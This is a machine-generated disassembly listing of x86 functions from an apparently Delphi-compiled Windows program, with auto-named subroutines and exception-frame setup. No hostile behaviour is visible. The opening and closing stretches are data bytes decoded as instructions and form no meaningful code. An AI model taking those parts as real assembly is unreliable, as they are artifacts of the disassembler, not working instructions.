sar dl 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
xchg [ eax ] al
add bh bh
jo r-xdata
inc esp
add [ esi + ecx * 4 + 0x44 ] bl
add [ eax ] bl
lea eax [ eax + eax - 0xc ]
bound eax [ ebp ]
or [ ebx + 0x45 ] ah
add [ eax - 0x73 ] dl
inc esp
add [ eax ] dh
arpl [ ebp ] ax
lodsb [ esi ]
lea eax [ eax + eax + 0x38 ]
arpl [ ebp ] ax
int3
add al cl
sbb [ edx ] al
jo r-xdata
inc edx
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_42fa78
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
sti
jo r-xdata
inc esp
add [ edx + 0x45 ] bh
add ah ah
mov [ eax + eax - 0x5c ] es
loopne r-xdata
popad
je r-xdata
bound eax [ ebp ]
cmp ah al
inc edx
add [ eax + ebx + 0x42 ] dh
je r-xdata
inc edx
add [ eax ] ch
add [ eax ] al
add [ ebx + ebx * 2 + 0x44 ] cl
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
sub [ eax ] bl
inc edx
add [ esp + eax * 8 ] dl
inc esp
add [ eax + ebx + 0x42 ] bl
add [ ebp + ecx * 4 + 0x7f00044 ] al
inc ebx
add [ eax ] dh
mov es [ eax + eax - 0x20 ]
pop ss
nop
sar dl 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5 ] bl
inc esp
add [ esi + ecx * 4 + 0x44 ] bl
add [ eax ] bl
lea eax [ eax + eax - 0xc ]
bound eax [ ebp ]
or [ ebx + 0x45 ] ah
add [ eax - 0x73 ] dl
inc esp
add [ eax ] dh
arpl [ ebp ] ax
lodsb [ esi ]
lea eax [ eax + eax + 0x38 ]
arpl [ ebp ] ax
int3
add al cl
sbb [ edx ] al
jo r-xdata
inc edx
sub_42fb68
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_42fbe3
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_42fc00
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_418f04
mov [ esi + 0x18 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42fc3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_404210
test eax eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_418fa8
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_403fa4
pop esi
pop ebx
retn
sub_42fc9c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_42fe34
push eax
mov edx esi
mov eax ebx
call sub_42fe34
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x28 ]
pop edi
pop esi
pop ebx
retn
sub_42fcd8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1d ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4192f0
dec eax
jle r-xdata
push esi
mov eax ebx
call sub_4192f0
mov ecx eax
dec ecx
xor edx edx
mov eax ebx
call sub_42fda0
sub_42fd08
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
pop ebx
retn
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_407edc
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_407ea4
jmp r-xdata
pop ebx
retn
sub_42fd44
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42fe34
mov ebp eax
mov edx edi
mov eax ebx
call sub_42fe34
mov [ esp ] eax
mov edx esi
mov eax ebx
call sub_42fe34
call sub_418f90
mov esi eax
mov edx edi
mov eax ebx
call sub_42fe34
call sub_418f90
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx esi
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42fda0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42fd44
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42fda0
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42fe6c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_419638
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x1d ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42feb4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_456360
mov [ esi + 0xc8 ] 0xffffffff
mov [ esi + 0x60 ] 0x0
mov dl 0x1
mov eax esi
call sub_456618
mov dl 0x1
mov eax esi
call sub_4300a4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42ff0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x1
xor eax eax
push ebp
push sub_430025
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x0
retn
mov eax edi
mov edx [ r-xdata ]
call sub_403304
mov ecx eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4185b0
cmp edi [ eax + 0x20 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4185b0
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403304
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4185b0
pop edx
mov ecx [ eax ]
call [ ecx + 0x8c ]
sub_430034
push ebx
push ecx
mov [ esp ] 0xffffffff
cmp [ eax + 0xba ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_430070
push ebx
mov ebx eax
mov eax ebx
call sub_42141c
mov al [ ebx + 0xa1 ]
test al al
je r-xdata
mov eax [ ebx + 0xac ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_4300a4
pop ebx
retn
mov edx eax
mov eax ebx
call sub_4301a4
sub_4300a4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xa0 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa0 ] dl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa1 ] dl
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
cmp eax 0xffffffff
je r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_430210
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x1
xor eax eax
push ebp
push sub_430171
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_4185b0
mov dl [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_4185b0
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
sub_4301a4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
test ebp ebp
je r-xdata
cmp ebp [ ebx + 0xa4 ]
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0xa4 ] ebp
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xac ] ebp
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4185b0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4185b0
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
sub_430210
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xc8 ] ebp
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4185b0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4185b0
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
sub_430270
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0xd2 ] 0x0
setne bl
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0xd4 ]
call [ esi + 0xd0 ]
sub_4302c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43038f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
cmp esi eax
jge r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430396
lea eax [ ebp - 0x18 ]
call sub_403f50
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_4303a0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
sub cl 0x1
jb r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
dec cl
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403304
mov eax [ eax + 0x28c ]
call sub_43c810
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ esp ]
mov edx [ eax + 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc esi
xor ebp ebp
inc ebp
dec esi
jne r-xdata
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_437d18
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_4377b8
mov eax [ esp ]
mov ecx [ eax + 0x18 ]
xor edx edx
mov eax ebx
call sub_437970
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_437868
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ esp ]
call sub_418f90
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_4185b0
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov eax [ esp ]
call sub_418f90
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_438670
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_4185b0
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
sub_430534
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4195cc
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
mov eax [ eax + 0x50 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
inc ebp
mov [ esp ] 0x0
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_403304
mov esi eax
mov eax ebx
call sub_418f90
mov edx eax
mov eax [ esi + 0x28c ]
call sub_42fe34
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebx + 0x18 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebx + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc [ esp ]
dec ebp
jne r-xdata
mov eax ebx
call sub_418f90
mov edx eax
mov eax [ esi + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_437da4
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
call sub_4377b8
mov ecx [ ebx + 0x18 ]
xor edx edx
mov eax esi
call sub_437970
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_437868
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx [ esp ]
call sub_4185b0
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
sub_430650
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42feb4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42fe6c
mov esi eax
mov [ ebx + 0xd0 ] esi
mov [ esi + 0x28 ] ebx
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4306b0
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
lea eax [ esi + 0xd0 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4563b4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4306ec
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov esi edx
mov edi eax
test esi esi
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ edi + 0xd0 ]
call sub_4192f0
cmp esi eax
jl r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ edi + 0xd0 ]
call sub_42fe34
mov edx eax
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ edi + 0xda ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx edi
mov eax [ edi + 0xdc ]
call [ edi + 0xd8 ]
sub_430758
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_42fe34
mov edx [ eax + 0x10 ]
mov eax edi
call sub_403fa4
pop edi
pop esi
pop ebx
retn
sub_43078c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_42fe34
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop edi
pop esi
pop ebx
retn
sub_4307c4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4307f0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_421890
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
cmp [ esi + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_4308a4
sub_430834
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
pop esi
pop ebx
retn
mov eax esi
call sub_4308a4
mov eax [ esi + 0x10 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
sub_4308a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4309e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4309ee
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov ebx [ esi + 0x10 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403304
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_42fe34
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x90 ]
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x94 ]
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_42fe34
mov ecx eax
mov edx ebx
mov eax edi
call sub_4306ec
test al al
je r-xdata
jmp r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_430270
test al al
je r-xdata
sub_4309fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430a1b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430a22
retn
sub_430a28
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403304
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_430a60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430a85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430a8c
retn
sub_430a98
pushfd
or al [ ebx ]
add edx [ ecx ]
push esp
push ebx
je r-xdata
or [ eax + 0x62 ] esi
je r-xdata
add [ eax + 0x6000418c ] bl
jb r-xdata
insd
inc ebx
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push edx
inc ebx
add [ eax + 0x53 ] dl
inc ebx
add [ eax - 0x47ffbe70 ] cl
nop
inc ecx
add [ eax + 0x14004190 ] dh
push edx
inc ebx
add [ esi ] cl
add [ eax ] al
mov [ ecx ] es
pushad
or [ fs : eax + 0x62 ] dh
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xc0040 ] dl
add [ eax ] al
or al 0x54
push ebx
je r-xdata
insb
jae r-xdata
add [ eax ] al
fmul [ edx ]
inc ebx
add [ esi ] al
popad
outsb
insb
push ebx
je r-xdata
add [ eax ] al
add [ esi ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
cwde
or al [ ebx ]
push es
insb
or eax [ ebx ]
add [ eax ] al
inc ecx
add [ eax - 0x67ffbe74 ] dl
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ edi + ecx * 4 ] bh
dec esp
outsd
ja r-xdata
dec esi
outsd
outsb
or [ gs : eax + 0x62 ] esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] cs
inc ebx
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
fmul [ edx ]
inc ebx
add [ 0xffffffff84ff0000 ] dl
push ebx
inc ebx
add [ ecx ] al
popad
outsb
insb
nop
mov al 0xb
inc ebx
add [ edi ] al
or al 0x54
push ebx
je r-xdata
